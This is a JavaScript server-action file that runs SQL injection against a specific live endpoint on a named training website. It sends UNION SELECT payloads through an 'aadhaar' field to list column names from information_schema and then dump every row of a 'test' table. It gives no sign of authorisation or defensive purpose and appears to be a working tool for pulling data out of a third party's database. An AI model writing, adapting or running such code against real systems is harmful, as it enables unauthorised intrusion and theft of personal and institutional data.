"use server";

import { generateRepeatedInjectionSegment } from "@/functions/generate-injection";
import maxCols, { regColumns } from "./max-cols";

/**
 *
 * @param {string} database name
 * @returns Array of tests details
 * @returns Error if not able to fetch which is when max columns is reached
 */
export default async function getTests(db) {
  const maxColsCount = maxCols();

  let injection = generateRepeatedInjectionSegment(
    `${process.env.AADHAAR}' UNION SELECT COLUMN_NAME`,
    25,
  ).concat(
    `FROM information_schema.COLUMNS where TABLE_NAME='test' and TABLE_SCHEMA='${db}`,
  );

  // console.log({ injection });

  //fetch columns details
  const res = await fetch(
    "https://training.nielitagt.in/training/assets/api/check_details1.php",
    {
      method: "POST",
      body: JSON.stringify({
        aadhaar: injection,
      }),
    },
  );

  const data = await res.json();

  //format test columns
  const test_cols = data.slice(2).map((row) => row.id);

  //calculate remaining columns
  const remainingColumns = maxColsCount - test_cols.length;

  if (remainingColumns <= 0) throw new Error("Can not Fetch Data");

  injection = generateRepeatedInjectionSegment(
    `${process.env.AADHAAR}' UNION SELECT *`,
    remainingColumns,
  ).concat(`FROM ${db}.test where '1'='1`);

  // console.log({ injection });

  //fetch test details
  const res2 = await fetch(
    "https://training.nielitagt.in/training/assets/api/check_details1.php",
    {
      method: "POST",
      body: JSON.stringify({
        aadhaar: injection,
      }),
    },
  );

  const data2 = (await res2.json()).slice(2);

  //format tests details
  const test = data2.map((row) =>
    test_cols.reduce((acc, current, index) => {
      acc[current] = row[regColumns()[index]];
      return acc;
    }, {}),
  );

  return [test_cols, test];
}
